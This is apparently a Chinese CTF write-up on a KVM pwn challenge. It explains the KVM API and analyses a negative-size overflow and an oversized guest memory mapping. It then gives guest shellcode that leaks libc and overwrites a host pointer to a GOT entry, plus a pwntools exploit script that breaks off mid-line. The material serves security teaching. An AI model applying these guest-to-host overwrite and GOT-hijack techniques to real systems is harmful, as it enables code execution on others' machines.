class="number">172.17</span><span class="number">.0</span><span class="number">.2</span>/<span class="number">16</span> brd <span class="number">172.17</span><span class="number">.255</span><span class="number">.255</span> scope global eth0</span><br><span class="line">       valid_lft forever preferred_</span><br></pre></td></tr></table></figure>
<ul>
<li>docker IP addr：172.17.0.2</li>
</ul>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">root</span>@<span class="number">9622</span>bccfc<span class="number">102</span>:/home/ctf# gdbserver <span class="number">127.0.0.1:7777</span> ./mykvm</span><br><span class="line"><span class="attribute">Process</span> ./mykvm created; pid = <span class="number">251</span></span><br><span class="line"><span class="attribute">Listening</span> <span class="literal">on</span> port <span class="number">7777</span></span><br><span class="line"><span class="attribute">Remote</span> debugging from host <span class="number">172.17.0.1</span></span><br></pre></td></tr></table></figure>
<ul>
<li>gdbserver port：7777</li>
</ul>
<p>然后再外部使用以下命令进行连接：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; target remote <span class="number">172.17</span><span class="number">.0</span><span class="number">.2</span>:<span class="number">7777</span></span><br></pre></td></tr></table></figure>
<p><strong>KVM api 使用案例</strong></p>
<p>首先，我们需要打开 <code>/dev/kvm</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kvm = open(<span class="string">&quot;/dev/kvm&quot;</span>, O_RDWR | O_CLOEXEC);</span><br></pre></td></tr></table></figure>
<p>接下来，我们需要创建一个虚拟机（VM），它表示与一个模拟系统关联的所有内容，包括内存和一个或多个 CPU，KVM 以文件描述符的形式为我们提供此 VM 的句柄：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vmfd = ioctl(kvm, KVM_CREATE_VM, (<span class="keyword">unsigned</span> <span class="keyword">long</span>)<span class="number">0</span>); </span><br><span class="line"><span class="comment">/* KVM_CREATE_VM:0xae01 */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>KVM 系统提供文件描述符来控制虚拟机 </li>
</ul>
<p>虚拟机需要我们提供内存，对应虚拟机中的物理地址空间：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mem = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li>申请一页内存来保存测试代码，直接使用 mmap 获得页对齐的、初始值为 0 的内存</li>
</ul>
<p>将机器码复制到这块内存：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memcpy</span>(mem, code, <span class="keyword">sizeof</span>(code));</span><br></pre></td></tr></table></figure>
<p>使用 KVM_SET_USER_MEMORY_REGION 通知 KVM 虚拟机有4096字节的内存：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kvm_userspace_memory_region</span> <span class="title">region</span>=</span> &#123;</span><br><span class="line">    .slot = <span class="number">0</span>,</span><br><span class="line">    .guest_phys_addr= <span class="number">0x1000</span>,</span><br><span class="line">    .memory_size = <span class="number">0x1000</span>,</span><br><span class="line">    .userspace_addr = (<span class="keyword">uint64_t</span>)mem,</span><br><span class="line">&#125;;</span><br><span class="line">ret = ioctl(vmfd, KVM_SET_USER_MEMORY_REGION, &amp;region); </span><br><span class="line"><span class="comment">/* KVM_SET_USER_MEMORY_REGION:0x4020ae46 */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>slot 字段表示 KVM 中内存空间的索引：<ul>
<li>当我们使用相同的 slot 调用 KVM_SET_USER_MEMORY_REGION 时会替换掉这个 mapping，当使用新的 slot 调用 KVM_SET_USER_MEMORY_REGION 时会创建新的 mapping</li>
</ul>
</li>
<li>guest_phys_addr 虚机中的基础物理地址</li>
<li>userspace_addr 指向我们通过 mmap 申请的内存，注意这是一个 64-bit 的值</li>
<li>memory_size 表示要映射的内存的大小：0x1000字节</li>
</ul>
<p>现在我们的 VM 中有内存，内存中有要运行的代码，现在我们创建一个 VCPU 去运行这些代码，KVM 提供给我们控制这个 VCPU 的文件描述符，0 表示虚拟 CPU 的索引，索引的最大值可通过 KVM_CAP_MAX_VCPUS 获得：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vcpufd= ioctl(vmfd, KVM_CREATE_VCPU, (<span class="keyword">unsigned</span> <span class="keyword">long</span>)<span class="number">0</span>); </span><br><span class="line"><span class="comment">/* KVM_CREATE_VCPU:0xae41 */</span></span><br></pre></td></tr></table></figure>
<p>每个虚拟CPU都关联一个 kvm_run 结构体，这个结构体用来在内核和用户空间传递 CPU 的信息，尤其是当硬件虚拟化停止时(vmexit)，kvm_run 结构体包含停止原因</p>
<p>我们将这个结构体通过 mmap 映射到用户空间，首先我们通过 KVM_GET_VCPU_MMAP_SIZE 得知有多少内存需要映射：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mmap_size = ioctl(kvm, KVM_GET_VCPU_MMAP_SIZE, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">/* KVM_GET_VCPU_MMAP_SIZE:0xae04 */</span></span><br></pre></td></tr></table></figure>
<p>一般 mmap_size 大于 kvm_run 结构体的大小，因为内核会使用这片区域去存其它的瞬态信息，使用 mmap 映射 kvm_run 结构体：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run = mmap(<span class="literal">NULL</span>, mmap_size, PROT_READ|PROT_WRITE, MAP_SHARED, vcpufd, <span class="number">0</span>);</span><br><span class="line"><span class="comment">/* PROT_READ|PROT_WRITE:3 */</span></span><br><span class="line"><span class="comment">/* MAP_SHARED:1 */</span></span><br></pre></td></tr></table></figure>
<p>VCPU 同样包括寄存器，KVM 将寄存器分为两类：标准寄存器和特殊寄存器，分别使用 kvm_regs 和 kvm_sregs 结构体表示，在运行我们的代码前要先初始化这个寄存器</p>
<ul>
<li>初始化特殊寄存器：我们只需设置 cs 寄存器，将 cs 的 base 和 selector 设为“0”</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ret = ioctl(vcpufd, KVM_GET_SREGS, &amp;sregs);</span><br><span class="line">sregs.cs.base = <span class="number">0</span>;</span><br><span class="line">sregs.cs.selector = <span class="number">0</span>;</span><br><span class="line">ret = ioctl(vcpufd, KVM_SET_SREGS, &amp;sregs);</span><br><span class="line"><span class="comment">/* KVM_SET_SREGS:0x8138ae83 */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>初始化标准寄存器：我们大部分设为“0”，instruction pointer 设为“0x1000”，al 和 bl 设为“2”，flags 寄存器设置为“2”</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kvm_regs</span> <span class="title">regs</span> =</span> &#123;</span><br><span class="line">    .rip = <span class="number">0x1000</span>,</span><br><span class="line">    .rax = <span class="number">2</span>,</span><br><span class="line">    .rbx = <span class="number">2</span>,</span><br><span class="line">    .rflags = <span class="number">0x2</span>,</span><br><span class="line">&#125;;</span><br><span class="line">ret = ioctl(vcpufd, KVM_SET_REGS, &amp;regs);</span><br><span class="line"><span class="comment">/* KVM_SET_REGS:0x4090ae82 */</span></span><br></pre></td></tr></table></figure>
<p>创建 VM 和 VCPU、映射和初始化内存、并设置初始寄存器状态后，我们现在可以使用 KVM_RUN 开始使用 VCPU 运行指令</p>
<p>每次虚拟化停止时，它都会返回，因此我们将在循环中运行它：（根据停止原因进行相应的处理）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">    ret = ioctl(vcpufd, KVM_RUN, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">/* KVM_RUN:0xae80 */</span></span><br><span class="line">    <span class="keyword">switch</span> (run-&gt;exit_reason) &#123; <span class="comment">/* kvm_run结构体包含停止原因 */</span></span><br><span class="line">        <span class="comment">/* Handle exit */</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>参考：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://lwn.net/Articles/658511/">使用 KVM API</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/zhang_syi/article/details/52718329?spm=1001.2014.3001.5502">KVM学习1—安装编译测试kvm模块</a> </li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/zhang_syi/article/details/52718366">KVM学习2—使用KVM API创建并运行虚拟机</a> </li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/zhang_syi/article/details/52718377?spm=1001.2014.3001.5502">KVM学习3—编写简单在虚拟机中学习的汇编程序</a> </li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ioctl</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">unsigned</span> <span class="keyword">long</span> request, ...)</span></span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>fd：文件描述符 </li>
<li>request：命令码，应用程序通过下发命令码来控制驱动程序完成对应操作</li>
<li>“…”：是可变参数 arg，一些情况下应用程序需要向驱动程序传参，参数就通过 ag 来传递</li>
<li>返回值：驱动程序中 ioctl 接口给的返回值，驱动程序可以通过返回值向用户程序传参，ioctl 运行失败时一定会返回“-1”并设置全局变量 errorno</li>
</ul>
<p><strong>关于汇编的知识</strong></p>
<p>MOVZX 指令（进行全零扩展并传送）将源操作数复制到目的操作数，并把目的操作数0扩展到16位或32位（这条指令只用于无符号整数）</p>
<ul>
<li>下图展示了如何将源操作数进行全零扩展，并送入16位目的操作数：</li>
</ul>
<img src="/2022/07/12/KVM%20pwn/1657603737686.png" class width="1657603737686"> 
<p>MOVSX 指令（进行符号扩展并传送）将源操作数内容复制到目的操作数，并把目的操作数符号扩展到16位或32位（这条指令只用于有符号整数）</p>
<ul>
<li>下图展示了如何将源操作数进行符号扩展（符号位为“1”），并送入16位目的操作数：</li>
</ul>
<img src="/2022/07/12/KVM%20pwn/1657603860296.png" class width="1657603860296"> 
<p>全零扩展：零扩展就是全补零，不论其符号位是多少，高位全都补 “0”</p>
<p>符号扩展：当用更多的内存存储某一个有符号数时，由于符号位位于该数的第一位，扩展之后，符号位仍然需要位于第一位：</p>
<ul>
<li>当扩展一个负数时，需要将扩展的高位全赋为 “1”</li>
<li>当扩展一个正数时（包括无符号数），符号扩展和零扩展是一样的，因为符号位就是 “0”</li>
</ul>
<p>案例：</p>
<ul>
<li>用8位二进制表示 “-1”，则是  11111111 </li>
<li>用16位二进制表示时，则为 11111111 11111111 高位全都是 “1”，这个叫做符号扩展，主要用于对齐操作数</li>
</ul>
<p>汇编语言中，CPU 对外设的操作通过专门的端口读写指令来完成：读端口用 IN 指令，写端口用 OUT 指令</p>
<p><strong>漏洞分析</strong></p>
<p>漏洞点一：负数溢出</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;your code size: &quot;</span>);</span><br><span class="line">__isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;kvm);                 <span class="comment">// int</span></span><br><span class="line"><span class="keyword">if</span> ( kvm.size &lt;= <span class="number">4096</span> )                     <span class="comment">// int</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;your code: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, kvm.code, kvm.size);              <span class="comment">// unsigned int,负数溢出</span></span><br><span class="line">  kvm.name = input_line(<span class="string">&quot;guest name: &quot;</span>);</span><br><span class="line">  kvm.name = input_line(<span class="string">&quot;guest passwd: &quot;</span>);</span><br><span class="line">  pwn(kvm.code, kvm.size);</span><br><span class="line">  kvm.name = input_line(<span class="string">&quot;host name: &quot;</span>);</span><br><span class="line">  <span class="built_in">memcpy</span>(dest, kvm.name, <span class="number">0x20</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Bye!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>令 kvm.size = -1，下一个 read 就会有栈溢出</li>
<li>不过有 canary 的限制，不能直接利用</li>
</ul>
<p>漏洞点二：没有置空</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Struct kvm; <span class="comment">// [rsp+4h] [rbp-101Ch] BYREF</span></span><br><span class="line"><span class="keyword">unsigned</span> __int64 canary; <span class="comment">// [rsp+1018h] [rbp-8h]</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>Struct kvm 在栈上占用的范围很大，其中包含了大量存留指针</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memcpy</span>(</span><br><span class="line">  (&amp;code_bss - (((((&amp;code_bss &gt;&gt; <span class="number">0x1F</span>) &gt;&gt; <span class="number">0x14</span>) + &amp;code_bss) &amp; <span class="number">0xFFF</span>) - ((&amp;code_bss &gt;&gt; <span class="number">0x1F</span>) &gt;&gt; <span class="number">0x14</span>)) + <span class="number">0x1000</span>),</span><br><span class="line">  code,</span><br><span class="line">  size);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>memcpy 中的 size 我们可以控制</li>
<li>只要 size 足够大，就可以把栈上的指针 copy 到 bss 段（方便后续利用）</li>
</ul>
<p>漏洞点三：越界</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">region.slot = <span class="number">0</span>;</span><br><span class="line">region.flags = <span class="number">0</span>;</span><br><span class="line">region.guest_phys_addr = <span class="number">0LL</span>;</span><br><span class="line">region.memory_size = <span class="number">0x40000000</span>LL;            <span class="comment">// 这里肯定有溢出</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>memory_size 表示要映射的内存的大小：0x40000000 字节</li>
<li>映射内存范围过大，导致 guest 代码能访问到宿主机的 bss 段中的其他变量 </li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.bss:<span class="number">0000000000602100</span> ??                            code_bss db    ? ;                      ; DATA XREF: pwn+<span class="number">8</span>C↑o</span><br><span class="line">    ......</span><br><span class="line">.bss:<span class="number">000000000060</span>A100 ?? ?? ?? ?? ?? ?? ?? ??       dest dq ?                               ; DATA XREF: main+<span class="number">7</span>E↑w</span><br></pre></td></tr></table></figure>
<ul>
<li>很明显可以通过 code_bss 访问到 dest</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>首先肯定要先 leak libc_base，然后通过 code_bss 的溢出来覆盖 dest（可以是 got 或者 hook）</p>
<p>然后在以下代码中输入 one_gadget 就可以了：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kvm.name = input_line(<span class="string">&quot;host name: &quot;</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(dest, kvm.name, <span class="number">0x20</span>uLL); </span><br></pre></td></tr></table></figure>
<p>问题的关键就是：写一段由 VCPU 运行的 code 来进行泄露</p>
<p>先使用以下一段 code 进行测试，看看到底泄露了什么东西</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">code=asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        .code16</span></span><br><span class="line"><span class="string">        lable:</span></span><br><span class="line"><span class="string">            mov al,byte ptr ds:[bx]</span></span><br><span class="line"><span class="string">            out 0,al</span></span><br><span class="line"><span class="string">            add bx,1</span></span><br><span class="line"><span class="string">            cmp bx,0x200</span></span><br><span class="line"><span class="string">            jna lable</span></span><br><span class="line"><span class="string">        hlt</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>利用汇编指令 <code>out</code> 把 al 寄存器中的值输出到 [标准输出]</li>
</ul>
<p>结果：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bbbbbbbb</span><br><span class="line">\x8a\x07�\x00\x83$</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>发现泄露的数据是从 0x603000 开始的</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0x603000</span></span><br><span class="line"><span class="number">0x603000</span>:	<span class="number">0x8101c38300e6078a</span>	<span class="number">0x0000f4f3760200fb</span></span><br><span class="line"><span class="number">0x603010</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>而距离它偏移为 0x358 的地方就有前面 copy 进去的存留指针</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; distance <span class="number">0x603000</span> <span class="number">0x603358</span></span><br><span class="line"><span class="number">0x603000</span>-&gt;<span class="number">0x603358</span> is <span class="number">0x358</span> bytes (<span class="number">0x6b</span> words)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>那么进行 leak 的 code 就可以这样写：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">code=asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        .code16</span></span><br><span class="line"><span class="string">        mov bx,0x8</span></span><br><span class="line"><span class="string">        mov ax,0x35</span></span><br><span class="line"><span class="string">        mov ds,ax</span></span><br><span class="line"><span class="string">        lable:</span></span><br><span class="line"><span class="string">            mov al,byte ptr ds:[bx]</span></span><br><span class="line"><span class="string">            out 0,al</span></span><br><span class="line"><span class="string">            add bx,1</span></span><br><span class="line"><span class="string">            cmp bx,0x200</span></span><br><span class="line"><span class="string">            jna lable</span></span><br><span class="line"><span class="string">        hlt</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>接下来用同样的思路覆盖 dest：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; distance <span class="number">0x603000</span> <span class="number">0x60A100</span></span><br><span class="line"><span class="number">0x603000</span>-&gt;<span class="number">0x60a100</span> is <span class="number">0x7100</span> bytes (<span class="number">0xe20</span> words)</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">code=asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        .code16</span></span><br><span class="line"><span class="string">        mov bx,0x8</span></span><br><span class="line"><span class="string">        mov ax,0x35</span></span><br><span class="line"><span class="string">        mov ds,ax</span></span><br><span class="line"><span class="string">        mov ax,0x710</span></span><br><span class="line"><span class="string">        mov ss,ax</span></span><br><span class="line"><span class="string">        lable:</span></span><br><span class="line"><span class="string">            mov al,byte ptr ds:[bx]</span></span><br><span class="line"><span class="string">            out 0,al</span></span><br><span class="line"><span class="string">            add bx,1</span></span><br><span class="line"><span class="string">            cmp bx,0x200</span></span><br><span class="line"><span class="string">            jna lable</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        xor bx,bx</span></span><br><span class="line"><span class="string">        mov al,0x0B</span></span><br><span class="line"><span class="string">        mov ss:[bx+0x0],al</span></span><br><span class="line"><span class="string">        mov al,0x20</span></span><br><span class="line"><span class="string">        mov ss:[bx+0x1],al</span></span><br><span class="line"><span class="string">        mov al,0x60</span></span><br><span class="line"><span class="string">        mov ss:[bx+0x2],al</span></span><br><span class="line"><span class="string">        mov al,0</span></span><br><span class="line"><span class="string">        mov ss:[bx+0x3],al</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        hlt</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>把 dest 覆盖为 got 表地址附近，方便修改 put_got</li>
</ul>
<p>最后还有一个问题，readline() 函数会将相当一部分不可见字符转义：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x602000</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│             <span class="number">0x602000</span> —▸ <span class="number">0x601e18</span> ◂— <span class="number">0x5858585858585858</span> (<span class="string">&#x27;XXXXXXXX&#x27;</span>)</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│ rax<span class="number">-3</span> rdi<span class="number">-3</span> <span class="number">0x602008</span> ◂— <span class="number">0x6161616161136168</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│             <span class="number">0x602010</span> ◂— <span class="string">&#x27;aaaaaaaaaaaaaaaaaaaaaaaaGb&#x27;</span></span><br><span class="line">... ↓                <span class="number">2</span> skipped</span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│             <span class="number">0x602028</span> (<span class="built_in">puts</span>@got.plt) ◂— <span class="number">0x7f9eec006247</span> <span class="comment">/* &#x27;Gb&#x27; */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>解决的办法就是：检查 one_gadget 的每一字节，如果是不可见字符则重启程序</li>
</ul>
<p>完整 exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>,arch=<span class="string">&quot;amd64&quot;</span>)</span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">    flag=<span class="number">0</span></span><br><span class="line">    p=process(<span class="string">&#x27;./mykvm&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    code=asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            .code16</span></span><br><span class="line"><span class="string">            mov bx,0x8</span></span><br><span class="line"><span class="string">            mov ax,0x35</span></span><br><span class="line"><span class="string">            mov ds,ax</span></span><br><span class="line"><span class="string">            mov ax,0x710</span></span><br><span class="line"><span class="string">            mov ss,ax</span></span><br><span class="line"><span class="string">            lable:</span></span><br><span class="line"><span class="string">                mov al,byte ptr ds:[bx]</span></span><br><span class="line"><span class="string">                out 0,al</span></span><br><span class="line"><span class="string">                add bx,1</span></span><br><span class="line"><span class="string">                cmp bx,0x200</span></span><br><span class="line"><span class="string">                jna lable</span></span><br><span class="line"><span class="string">            </span></span><br><span class="line"><span class="string">            xor bx,bx</span></span><br><span class="line"><span class="string">            mov al,0x0B</span></span><br><span class="line"><span class="string">            mov ss:[bx+0x0],al</span></span><br><span class="line"><span class="string">            mov al,0x20</span></span><br><span class="line"><span class="string">            mov ss:[bx+0x1],al</span></span><br><span class="line"><span class="string">            mov al,0x60</span></span><br><span class="line"><span class="string">            mov ss:[bx+0x2],al</span></span><br><span class="line"><span class="string">            mov al,0</span></span><br><span class="line"><span class="string">            mov ss:[bx+0x3],al</span></span><br><span class="line"><span class="string">            </span></span><br><span class="line"><span class="string">            hlt</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#gdb.attach(r,&quot;b*0x400E64&quot;)</span></span><br><span class="line"></span><br><span class="line">    size = <span class="number">0x1000</span></span><br><span class="line">    name = <span class="string">&quot;a&quot;</span>*<span class="number">0x8</span></span><br><span class="line">    passwd = <span class="string">&quot;b&quot;</span>*<span class="number">0x8</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;your code size:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;your code:&quot;</span>,code)</span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;guest name:&quot;</span>,name)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;guest passwd:&quot;</span>,passwd)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&quot;b&quot;</span>*<span class="number">0x8</span>+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    leak_addr=u64(p.recv(<span class="number">8</span>))</span><br><span class="line">    libc_base=leak_addr-<span class="number">0x3d1198</span></span><br><span class="line">    success(<span 